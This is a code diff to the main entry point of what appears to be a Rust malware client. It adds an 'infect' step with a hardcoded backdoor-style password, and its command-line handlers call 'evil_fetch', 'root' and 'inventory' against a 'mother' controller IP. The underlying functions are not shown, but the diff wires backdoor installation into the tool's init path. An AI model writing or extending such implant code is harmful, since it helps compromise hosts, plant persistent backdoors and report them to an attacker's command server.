@@ -1,5 +1,5 @@
 pub mod client;
-use crate::client::types::{Host, OS};
+use crate::client::types::{Host, Infect,  OS};
 use crate::client::utils::{install_docker, install_serial_scripter};
 
 use clap::{arg, command, value_parser, Command};
@@ -67,11 +67,12 @@ async fn main() {
             let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
             let port = sub_matches.get_one::<u16>("port").unwrap();
 
-
             match client::client::evil_fetch(mother_ip, port).await {
                 Ok(_) => println!("Infect operation successful"),
                 Err(_) => println!("Infect operation failed"),
             }
+
+            
         }
         Some(("root", sub_matches)) => {
             let lifetime = sub_matches.get_one::<u8>("lifetime").unwrap();
@@ -79,17 +80,20 @@ async fn main() {
             let port = sub_matches.get_one::<u16>("port").unwrap();
 
             let host = Host::new();
-            host.root(&mother_ip.to_string(), *port, *lifetime);
+            let _ = host.root(&mother_ip.to_string(), *port, *lifetime);
         }
         Some(("ip", _)) => println!("{}", Host::ip()),
         Some(("init", sub_matches)) => {
             let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
             let api_key = sub_matches.get_one::<String>("key").unwrap();
 
-            let _host = Host::new()
+            let host = Host::new();
+            host.infect(69, "OmegaBacksh0ts!");
+            host
                 .inventory(&mother_ip.to_string(), &api_key)
                 .await;
         }
         _ => {}
     }
 }
+
